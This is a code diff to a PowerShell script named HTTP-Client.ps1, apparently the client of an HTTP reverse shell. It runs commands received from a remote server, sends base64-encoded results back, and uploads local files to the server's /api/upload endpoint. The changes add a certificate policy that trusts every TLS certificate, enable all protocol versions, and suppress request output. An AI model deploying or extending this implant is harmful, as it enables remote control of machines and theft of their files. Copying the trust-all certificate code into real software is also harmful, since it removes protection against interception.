@@ -14,9 +14,24 @@ $userAgent = "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"
 if (($args[0] -like "-h*") -or ($args[1] -eq $null)){
 Write-Host "[!] Usage: .\HTTP-Client.ps1 -c [HOST:PORT] -s [SLEEP] (optional)`n" -ForegroundColor "Red" ; exit }
 
-# Proxy Aware
+# Proxy Aware & TLS Legacy Support
+add-type @"
+using System.Net;
+using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {
+public bool CheckValidationResult(
+ServicePoint srvPoint, X509Certificate certificate,
+WebRequest request, int certificateProblem) {
+return true; }}
+"@
+
+$Values = $(Foreach ($Value in [System.Enum]::GetNames([System.Net.SecurityProtocolType])){
+[System.Net.SecurityProtocolType]::$Value}) ; $SecureProtocols = [string]$Values
 [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
 [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+$AllProtocols = [System.Net.SecurityProtocolType]"$($SecureProtocols.replace(' ',','))"
+[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
 
 # Functions
 function GetEnviron {
@@ -76,10 +91,10 @@ while ($true) {
       $file_path = $invoke64.toString().Split(" ",2)[1].Split("!")[0] ; $invoke64 = $null
       if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
       $file_content = R64Encoder -f "$file_path"
-      $upload = $(Send-HttpRequest "$server/api/upload" "POST" "File: $file_content") }
+      $upload = $(Send-HttpRequest "$server/api/upload" "POST" "File: $file_content") 2>&1> $null }
 
    if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 ; $param = "Debug"
    if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
    if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
    $output64 = R64Encoder -t $commandx ; [string]$path = $param.toLower()
-   $request2 = $(Send-HttpRequest "$server/api/$path" "POST" "$param`: $output64") }}
+   $request2 = $(Send-HttpRequest "$server/api/$path" "POST" "$param`: $output64") 2>&1> $null }}
